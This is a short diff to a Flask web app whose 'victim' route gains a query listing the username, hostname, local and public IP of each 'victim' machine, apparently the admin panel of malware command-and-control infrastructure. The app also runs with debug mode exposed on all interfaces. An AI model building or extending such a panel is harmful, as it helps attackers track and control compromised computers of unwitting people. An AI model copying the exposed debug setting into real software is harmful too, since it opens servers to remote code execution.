@@ -83,9 +83,25 @@ def victim():
     with conn.cursor(DictCursor) as cursor:
         cursor.execute("SELECT username FROM list_admin WHERE username = %s", (username,))
         user_data = cursor.fetchone()
+        
+        # Fetch victim data, using 'created_at' instead of 'start_date'
+        cursor.execute(""" 
+            SELECT t.id, t.username, t.hostname, t.local_ip, t.public_ip, t.created_at
+            FROM system_info t
+            INNER JOIN (
+                SELECT hostname, MAX(created_at) AS max_time
+                FROM system_info
+                GROUP BY hostname
+            ) grouped 
+            ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
+        """)
+        victim_data = cursor.fetchall()  # Changed from victims to victim_data
+
     conn.close()
 
-    return render_template('victim.html')
+    return render_template('victim.html', user=user_data, victim_data=victim_data)  # Pass victim_data
+
+
 
 @app.route('/settings', methods=['GET', 'POST'])
 def settings():
@@ -231,7 +247,6 @@ def serve_static(filename):
 def logout():
     session.clear()
     return redirect(url_for('login'))
-
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0')
